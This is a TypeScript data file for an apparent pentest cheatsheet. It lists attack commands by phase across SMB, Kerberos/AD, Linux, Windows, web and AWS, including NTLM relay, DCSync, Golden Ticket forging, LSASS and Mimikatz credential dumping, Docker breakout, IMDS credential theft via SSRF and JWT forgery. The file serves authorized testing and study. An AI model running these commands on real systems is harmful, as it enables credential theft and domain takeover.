export interface CheatsheetCommand {
  label: string;
  command: string;
  description: string;
}

export interface CheatsheetService {
  id: string;
  title: string;
  port?: number | string;
  protocol: string;
  category: "Active Directory" | "Network Ports" | "Linux" | "Windows" | "Web" | "Cloud";
  summary: string;
  phases: {
    recon: CheatsheetCommand[];
    enumeration: CheatsheetCommand[];
    exploitation: CheatsheetCommand[];
    privesc?: CheatsheetCommand[];
  };
}

export const CHEATSHEETS: CheatsheetService[] = [
  {
    id: "smb-445",
    title: "SMB — Server Message Block",
    port: 445,
    protocol: "TCP/445, 139",
    category: "Network Ports",
    summary: "Critical network file sharing protocol. Prime vector for anonymous null sessions, SMB signing bypass, and EternalBlue/ZeroLogon/Relay attacks.",
    phases: {
      recon: [
        {
          label: "Nmap SMB Discovery",
          command: "nmap -p 139,445 --script smb-os-discovery,smb-security-mode,smb2-security-mode <TARGET>",
          description: "Detect OS version, domain name, NetBIOS name, and SMB signing requirements."
        },
        {
          label: "CrackMapExec SMB Dialect Check",
          command: "crackmapexec smb <TARGET> --gen-relay-list smb_relay.txt",
          description: "Quick probe for SMB signing status to identify relay targets."
        }
      ],
      enumeration: [
        {
          label: "Anonymous Null Session Shares",
          command: "netexec smb <TARGET> -u '' -p '' --shares",
          description: "List accessible network shares using unauthenticated null session."
        },
        {
          label: "Guest User Enumeration",
          command: "smbclient -N -L //<TARGET>",
          description: "Interactive anonymous SMB client share listing."
        },
        {
          label: "RPC Client User & Group Dump",
          command: "rpcclient -U \"\" -N <TARGET> -c \"enumdomusers; querydispinfo; enumdomgroups\"",
          description: "Dump Active Directory domain usernames and RID cycling via RPC."
        }
      ],
      exploitation: [
        {
          label: "EternalBlue (MS17-010) Probe & Exploit",
          command: "nmap -p 445 --script smb-vuln-ms17-010 <TARGET>",
          description: "Check remote code execution vulnerability in SMBv1 kernel driver."
        },
        {
          label: "SMB Hash Relay via Impacket",
          command: "impacket-ntlmrelayx -tf smb_relay.txt -smb2support -socks",
          description: "Intercept and relay NTLM authentication to execute interactive SOCKS proxy."
        }
      ],
      privesc: [
        {
          label: "PsExec System Shell Execution",
          command: "impacket-psexec DOMAIN/user:password@<TARGET> cmd.exe",
          description: "Instantiate remote NT AUTHORITY\\SYSTEM service shell over SMB."
        }
      ]
    }
  },
  {
    id: "active-directory-kerberos",
    title: "Kerberos & Active Directory Authentication",
    port: 88,
    protocol: "TCP/UDP 88",
    category: "Active Directory",
    summary: "Ticket-based domain authentication. Attack vectors include AS-REP Roasting, Kerberoasting, Unconstrained Delegation, and Overpass-the-Hash.",
    phases: {
      recon: [
        {
          label: "Identify Domain Controller & Kerberos",
          command: "nmap -p 88 --open -sV <TARGET_SUBNET>",
          description: "Locate active Domain Controllers listening on Kerberos KDC port 88."
        }
      ],
      enumeration: [
        {
          label: "AS-REP Roasting (No Pre-Auth Users)",
          command: "impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -format hashcat -outputfile asreproast.hash",
          description: "Query accounts that do not require Kerberos preauthentication to dump offline crackable TGT hashes."
        },
        {
          label: "Kerberoasting (SPN Account Hashes)",
          command: "impacket-GetUserSPNs domain.local/user:password -dc-ip <DC_IP> -request -outputfile kerberoast.hash",
          description: "Request TGS service tickets for service accounts and extract TGS-REP hash for offline cracking."
        }
      ],
      exploitation: [
        {
          label: "Crack Hashes with Hashcat",
          command: "hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt -o cracked.txt",
          description: "Crack Kerberos TGS-REP service ticket hashes (Hashcat mode 13100)."
        },
        {
          label: "DCSync Domain Credentials Dump",
          command: "impacket-secretsdump domain.local/admin:password@<DC_IP> -just-dc-ntlm",
          description: "Replicate Active Directory directory partition using DRSUAPI to harvest all domain user NTLM hashes."
        }
      ],
      privesc: [
        {
          label: "Golden Ticket Generation (KRBTGT)",
          command: "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain domain.local Administrator",
          description: "Forge a Golden Ticket granting permanent Domain Admin rights for 10 years."
        }
      ]
    }
  },
  {
    id: "linux-privesc",
    title: "Linux Privilege Escalation Vectors",
    protocol: "Local OS",
    category: "Linux",
    summary: "Systematic local enumeration, SUID root exploitation, sudoers misconfigurations, kernel exploits, and cron task hijackings.",
    phases: {
      recon: [
        {
          label: "Kernel & Architecture Triage",
          command: "uname -a; cat /etc/os-release; id; whoami",
          description: "Display Linux kernel build, distribution release, and effective UID/GID context."
        },
        {
          label: "Audit Sudo Permissions",
          command: "sudo -l",
          description: "Inspect active sudo policies for NOPASSWD binary entries on GTFOBins."
        }
      ],
      enumeration: [
        {
          label: "Search SUID & SGID Binaries",
          command: "find / -perm -u=s -type f 2>/dev/null",
          description: "Locate executables set to run under root privileges."
        },
        {
          label: "Monitor Background Cron Tasks (Pspy)",
          command: "./pspy64 -pf -i 1000",
          description: "Snoop on cron jobs and root daemon execution in real time without root permissions."
        },
        {
          label: "Audit Linux Capabilities",
          command: "getcap -r / 2>/dev/null",
          description: "Search for binaries configured with cap_setuid, cap_dac_override, or cap_net_raw."
        }
      ],
      exploitation: [
        {
          label: "GTFOBins Sudo NOPASSWD Escape",
          command: "sudo /usr/bin/find . -exec /bin/sh \\; -quit",
          description: "Break out into interactive root shell using find binary."
        },
        {
          label: "Shared Object (SO) Hijacking",
          command: "strace -f -e openat,access /usr/local/bin/custom_binary 2>&1 | grep -E \"\\.so.*NOENT\"",
          description: "Detect missing shared library dependencies loaded from writable directory."
        }
      ],
      privesc: [
        {
          label: "Docker Socket Root Breakout",
          command: "docker run -v /:/host -it alpine chroot /host /bin/bash",
          description: "Mount the host root filesystem inside an unconfined container."
        }
      ]
    }
  },
  {
    id: "windows-privesc",
    title: "Windows Privilege Escalation & Tokens",
    protocol: "Local OS",
    category: "Windows",
    summary: "Privilege escalation through SeImpersonatePrivilege, Juicy/Print/God Potato, unquoted service paths, and credential harvesting.",
    phases: {
      recon: [
        {
          label: "User Context & Privileges",
          command: "whoami /priv; whoami /groups; net user %USERNAME%",
          description: "Verify active user privileges (check for SeImpersonatePrivilege or SeDebugPrivilege)."
        }
      ],
      enumeration: [
        {
          label: "Unquoted Service Path Scan",
          command: "wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\"",
          description: "Locate services whose execution path contains spaces and lacks enclosing quotes."
        },
        {
          label: "AlwaysInstallElevated Registry Check",
          command: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
          description: "Check if non-administrators can install MSI packages with SYSTEM privileges."
        }
      ],
      exploitation: [
        {
          label: "GodPotato (SeImpersonate Abuse)",
          command: "GodPotato.exe -cmd \"cmd.exe /c whoami\"",
          description: "Abuse SeImpersonatePrivilege on Windows 10/11 & Server 2019/2022 to spawn SYSTEM."
        },
        {
          label: "Dump LSASS Memory via ProcDump",
          command: "procdump.exe -ma lsass.exe lsass.dmp",
          description: "Memory dump LSASS process to extract cleartext passwords and NTLM hashes offline."
        }
      ],
      privesc: [
        {
          label: "Extract Hashes via Mimikatz",
          command: "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit",
          description: "Extract logon passwords from offline LSASS dump."
        }
      ]
    }
  },
  {
    id: "web-exploitation",
    title: "Web Security & Injection Vectors",
    port: 80,
    protocol: "HTTP / HTTPS (80, 443)",
    category: "Web",
    summary: "Modern web vulnerability exploitation: Blind SQLi, Server-Side Request Forgery (SSRF), JWT vulnerabilities, and Command Injection.",
    phases: {
      recon: [
        {
          label: "Web Technology Stack Fingerprinting",
          command: "whatweb -a 3 http://<TARGET>",
          description: "Determine CMS, programming language, server headers, and cookie attributes."
        }
      ],
      enumeration: [
        {
          label: "Directory & VHost Fuzzing via Ffuf",
          command: "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<TARGET>/FUZZ -mc 200,301,302,403",
          description: "High-speed HTTP endpoint and secret file discovery."
        },
        {
          label: "SQLMap Automated Exploitation",
          command: "sqlmap -u \"http://<TARGET>/api/item?id=1\" --batch --dbs --risk=3 --level=3",
          description: "Automated injection verification and database schema extraction."
        }
      ],
      exploitation: [
        {
          label: "SSRF AWS IMDSv2 Token & Credential Steal",
          command: "TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\") && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          description: "Bypass AWS IMDSv2 metadata protection using SSRF to harvest IAM role STS tokens."
        },
        {
          label: "JWT None Algorithm Confusion",
          command: "python3 -c \"import jwt; print(jwt.encode({'user': 'admin', 'role': 'ADMIN'}, '', algorithm='none'))\"",
          description: "Forge unauthorized administrative tokens by setting the algorithm header to none."
        }
      ]
    }
  },
  {
    id: "aws-cloud-security",
    title: "AWS Cloud & Cognito Infrastructure",
    protocol: "Cloud HTTPS",
    category: "Cloud",
    summary: "Cloud assessment methodology targeting AWS Cognito identity pools, unauthenticated IAM roles, S3 bucket misconfigurations, and Lambda privilege escalation.",
    phases: {
      recon: [
        {
          label: "Enumerate S3 Bucket Permissions",
          command: "aws s3 ls s3://<BUCKET_NAME> --no-sign-request",
          description: "Test if target cloud object storage permits public read or anonymous list operations."
        }
      ],
      enumeration: [
        {
          label: "AWS Cognito Unauthenticated Identity Extraction",
          command: "aws cognito-identity get-id --identity-pool-id <POOL_ID> --no-sign-request",
          description: "Obtain an unauthenticated IdentityId from a public Cognito Identity Pool."
        },
        {
          label: "Obtain Temporary STS Credentials",
          command: "aws cognito-identity get-credentials-for-identity --identity-id <IDENTITY_ID> --no-sign-request",
          description: "Exchange the IdentityId for real AccessKeyId, SecretKey, and SessionToken."
        }
      ],
      exploitation: [
        {
          label: "Enumerate IAM Privileges (Pacu)",
          command: "pacu --session audit_session",
          description: "Automated AWS exploitation framework to identify privilege escalation paths."
        }
      ]
    }
  }
];
